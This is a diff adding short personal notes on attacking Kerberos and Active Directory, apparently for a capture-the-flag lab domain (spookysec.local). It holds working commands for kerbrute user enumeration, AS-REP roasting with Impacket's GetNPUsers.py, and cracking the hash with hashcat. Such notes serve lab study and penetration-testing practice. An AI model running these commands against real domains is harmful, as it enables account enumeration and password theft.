@@ -1,0 +1,41 @@
+KERBEROS / ACTIVE DIRECTORY
+
+OUTILS 
+	SUITE IMPACKET :
+		ASREProasting : ASReproasting occurs when a user account has the privilege "Does not require Pre-Authentication" set
+			python3 /opt/impacket/examples/GetNPUsers.py
+			
+		
+	BLOODHOUND 
+	NEO4J
+		apt install bloodhound neo4j
+	ENUM4LINUX
+		you know it my boyy
+	KERBRUTE
+		A tool to perform Kerberos pre-auth bruteforcing 
+		https://github.com/ropnop/kerbrute
+	SMBCLIENT
+		
+
+	
+ENUM FOR NETBIOS DOMAIN NAME
+	use enum4linux
+	
+SET DNS_DOMAIN_NAME (FOUND WITH NMAP -A) IN /ETC/HOSTS
+
+ENUM FOR USERS VIA KERBEROS
+	└─$ kerbrute userenum -d spookysec.local --dc spookysec.local userlist.txt
+	spookysec.local is the DNS_Domain_Name (found with nmap -A)
+	userlist.txt is a list of usernames
+
+RETRIEVING KERBEROS TICKETS
+	ASReproasting occurs when a user account has the privilege "Does not require Pre-Authentication" set
+	└─$ python3 /opt/impacket/examples/GetNPUsers.py -dc-ip 10.10.68.12 spookysec.local/svc-admin -no-pass
+		- svc-admin in a valid username found previously
+		- spookysec.local is the DNS_Domain_Name (found with nmap -A)
+		
+CRACK THE HASH
+	The one i got in thise case was : Kerberos 5 AS-REP etype 23
+	└─$ hashcat -a 0 -m 18200 hash /usr/share/wordlists/rockyou.txt --force 
+
+	
